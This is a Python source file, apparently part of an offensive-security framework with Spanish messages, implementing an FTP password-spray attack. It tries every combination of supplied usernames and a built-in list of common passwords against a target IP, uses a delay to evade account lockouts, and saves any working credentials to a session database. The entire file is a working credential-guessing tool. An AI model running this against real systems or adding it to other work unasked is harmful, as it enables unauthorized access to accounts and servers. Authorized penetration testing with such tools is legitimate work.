# scripts/ftp/attack/password_spray.py
import ftplib
import time
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

class Script(BaseScript):
    name        = "password-spray"
    protocol    = "ftp"
    category    = "attack"
    description = "Password spray FTP contra lista de usuarios. Delay configurable para evitar lockouts."

    DEFAULT_PASSWORDS = [
        "admin", "password", "123456", "ftp", "anonymous", "",
        "Password1", "P@ssw0rd", "admin123", "root", "toor",
        "test", "guest", "pass", "1234", "letmein",
    ]

    def run(self, **kwargs):
        port     = int(kwargs.get("port") or 21)
        timeout  = int(kwargs.get("timeout") or self.target.timeout or 5)
        userlist = kwargs.get("userlist")
        passlist = kwargs.get("passlist")
        delay    = float(kwargs.get("delay") or 1)
        ip       = self.target.ip

        users = []
        if userlist:
            try:
                with open(userlist) as f:
                    users = [l.strip() for l in f if l.strip()]
            except OSError as e:
                console.print(f"[red]No se pudo leer userlist: {e}[/red]")
                return None
        else:
            users = [self.creds.user or "admin"]

        passwords = list(self.DEFAULT_PASSWORDS)
        if passlist:
            try:
                with open(passlist) as f:
                    passwords = [l.strip() for l in f if l.strip()]
            except OSError as e:
                console.print(f"[red]No se pudo leer passlist: {e}[/red]")
                return None
        elif self.creds.password:
            passwords = [self.creds.password]

        print_result("FTP", ip, "info",
                     f"password-spray: {len(users)} usuario(s) × {len(passwords)} contraseña(s)")

        valid = []

        for user in users:
            for pwd in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(ip, port, timeout)
                    ftp.login(user, pwd)
                    ftp.quit()
                    print_result("FTP", ip, "pwned", f"CREDENCIALES VÁLIDAS: {user}:{pwd}")
                    valid.append((user, pwd))
                    session_db.save_credential(ip, user, pwd, "ftp_password",
                                               valid=True, source="ftp_spray")
                    session_db.save_finding(ip, "FTP", "valid_credentials", f"{user}:{pwd}")
                except ftplib.error_perm:
                    pass
                except Exception:
                    pass
                if delay:
                    time.sleep(delay)

        if valid:
            print_table(f"Credenciales válidas — {ip}:{port}",
                        ["Usuario", "Contraseña"], [(u, p) for u, p in valid])
        else:
            print_check("Password spray: sin credenciales válidas", ok=True)

        return valid
